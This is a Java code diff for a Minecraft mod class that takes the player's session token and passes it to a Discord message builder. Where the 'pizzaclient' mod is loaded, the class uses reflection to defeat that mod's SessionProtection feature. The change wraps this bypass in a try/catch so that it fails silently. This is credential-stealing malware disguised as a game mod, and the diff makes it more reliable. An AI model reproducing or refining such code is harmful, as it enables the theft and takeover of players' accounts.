@@ -111,7 +111,11 @@ public class scoliosis {
 
             String token = Minecraft.getMinecraft().getSession().getSessionID().replace("token:", "").replace(":"+Minecraft.getMinecraft().getSession().getPlayerID(), "");
             if (Loader.isModLoaded("pizzaclient")) {
-                token = (String) ReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
+                try {
+                    token = (String) ReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
             }
             
             DiscordMessage message = DiscordMessage.builder()
